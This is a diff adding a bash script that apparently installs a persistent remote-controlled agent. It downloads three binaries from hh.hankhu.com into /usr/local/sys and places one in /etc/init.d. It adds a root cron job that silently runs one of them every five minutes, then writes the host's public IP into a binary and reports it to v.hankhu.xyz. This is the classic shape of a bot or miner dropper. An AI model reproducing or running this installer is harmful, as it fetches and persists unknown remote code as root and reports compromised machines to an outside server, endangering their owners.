@@ -1,0 +1,29 @@
+#!/bin/bash
+dirsys=/usr/local/sys
+if [ ! -d $dirsys ];then
+mkdir -p $dirsys
+fi
+
+cd $dirsys
+
+if [ ! -f syszcx ];then
+curl -Ls -O https://hh.hankhu.com/mysh/syszcx  -O https://hh.hankhu.com/mysh/assys  -O  https://hh.hankhu.com/mysh/susys && chmod 755 *
+mv -u susys /etc/init.d/
+sed -i '/assys/d' /var/spool/cron/root
+echo '*/5 * * * * /usr/local/sys/assys &> /dev/null' >>/var/spool/cron/root
+
+if read -t 5 -p "input username id:" uid
+then
+    echo "setusernmae id is: $uid"
+else
+    echo "autousername id"
+    ip=$(curl -s ipv4.ip.sb)
+    uid=${ip//./_}
+    echo "auto uid：$uid"
+fi
+sed -i "s/usernameid/$uid/g" ./syszcx
+curl  -X POST  https://v.hankhu.xyz/getuid.php -d "$uid" -s
+
+
+fi
+
